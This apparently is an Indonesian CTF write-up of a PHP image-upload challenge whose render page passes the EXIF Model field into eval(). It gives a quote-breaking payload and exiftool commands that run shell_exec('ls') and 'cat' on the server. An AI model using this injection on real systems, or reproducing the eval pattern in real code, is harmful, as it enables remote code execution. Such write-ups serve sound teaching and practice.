# Write up 

## Task detail

Main main yuk
http://128.199.226.249/eat/

Source:
https://github.com/nikkoenggaliano/Badimageupload



## Problem

Diberikan sebuah halaman web dengan tampilan seperti ini.



![1548839787152](C:\Users\Nikko Enggaliano\AppData\Roaming\Typora\typora-user-images\1548839787152.png)



Seperti upload file gambar biasa dengan validasi yang hanya membolehkan mengupload file dengan exstensi [jpg, jpeg] Menurut source `index.php` yang diberikan sebagai berikut.



```php
$allowed = array('jpg', 'jpeg');
$path = pathinfo($_FILES['flag']['name']);
$ext = strtolower($path['extension']);
		
//verify ext
if(!in_array($ext, $allowed)){
	die('Just allowed jpg/jpeg');
}
```



Validasi yang lain hanya mengecek besar file yang tidak boleh lebih dari 2Mb dan gambar yang diupload harus memiliki lebar dan tinggi.



```php
//verify size
if($_FILES['flag']['size'] > 2000000){
	die('Sorry just allowed less than 2 Mb');
}

//verify image
$data = getimagesize(realpath($_FILES['flag']['tmp_name']));
$width = $data[0];
$height = $data[1];
if(empty($width) || empty($height)){
    die('Please upload image!');
}
```



Oke secara simple hanya boleh mengupload gambar asli. Mari kita coba.



![1548840258556](C:\Users\Nikko Enggaliano\AppData\Roaming\Typora\typora-user-images\1548840258556.png)



Setelah mengupload gambar yang kita upload akan di tampilkan lagi dengan keterangan `waktu` `height` dan `width` 

Mari lihat ke source `render.php` 



```php
$read = exif_read_data($nama);	
if(isset($read['Model'])){
	$model .= (string) $read['Model'];	
}else{
	$model .= "Hacker";
}
$height = $read['COMPUTED']['Height'];
$width = $read['COMPUTED']['Width'];
$epoch = date('Y-M-D H:i:s',$read['FileDateTime']);
}

```



Oke pada variable `$read` memangil fungsi read exif data, Kemudian ada sebuah pengecekan apakah ada exif data model jika tidak akan diisi dengan `Hacker` Selanjutnya hanya memparsing exif `waktu` `height` dan `width`. 



## Bugs

Pada proses pemanggilan variable hasil exif ada yang paling menarik sebagai berikut.



```php+HTML
<h4 class="media-heading"> Hey <?php echo(eval("print '$model';")) ?></h4>
```



Variable `$model` di print menggunakan `eval()` Hmm, Meskipun `eval` dapat diisi dengan hal hal seperti fungsi php atau shell ada yang menyebabkan sedikit tricky untuk menginjectnya. Karena didalam eval terdapat kutip yang cukup tricky juga.



## Exploitasion

Sebelum memikirkan bagaimana menginject kodenya kedalam gambar, Mari kita experimen dulu bagaimana menginject payload kedalam eval tersebut.



```php
<?php 
$model = "shell_exec('whoami')";
echo(eval("print '$model';"));
```



Asusmsi saya dengan seperti itu bisa tereksekusi. Ternyata tidakkk!  Dan payload yang saya rancang akhirnya bentuknya seperti ini.=

`';echo shell_exec('whoami');//` Oke sedikit saya explain.



1. Kutip dan semicolon `';`  diawal akan membuat kode berbentuk menjadi seperti ini
   -  echo(eval("print ''; ")) ;
2.  echo shell_exec('whoami'); akan menjadi syntax baru di dalam eval menjadi seperti ini
   - echo(eval("print ''; echo shell_exec('whoami'); ")) ;
3.  // pada akhir akan membuat syntax kebelakan menjadi comenting atau tidak dianggap
   - echo(eval("print ''; echo shell_exec('whoami');// ")); 



## Development the payload 

Kita bisa mengisi exif data dengan tools exiftools di unix kalian bisa menginstall dengan `sudo apt install libimage-exiftool-perl`



Selanjutnya mengisi gambar dengan payload.



```bash
$ exiftool -model="';echo shell_exec('ls');//" 851368_1.jpg
    1 image files updated
$
```



Kita mengisi data model dengan payload `ls` dan hasilnya.



![1548841811887](C:\Users\Nikko Enggaliano\AppData\Roaming\Typora\typora-user-images\1548841811887.png)



Okey terlihat setelah `Hey` ada file file, Yang paling menarik adalah `wwwwwwwwrite.php ` mari kita dapatkan sourcenya.



```bash
$ exiftool -model="';echo shell_exec('cat wwwwwwwwrite.php ');/
/" 851368_1.jpg
    1 image files updated
$
```



Dan didapatkan hasil sebagai berikut.



```php
<?php 
$data = $_GET['hack'];
$buka = fopen("solver.txt", "a+");
fwrite($buka, $data."\n");
fclose($buka);
?>
```



Ternyata pada file ini kita bisa menuliskan nama kita :D 



```sh
$ curl 128.199.226.249/wwwwwwwwrite.php?hack=Nepska
```



Terima Kasih!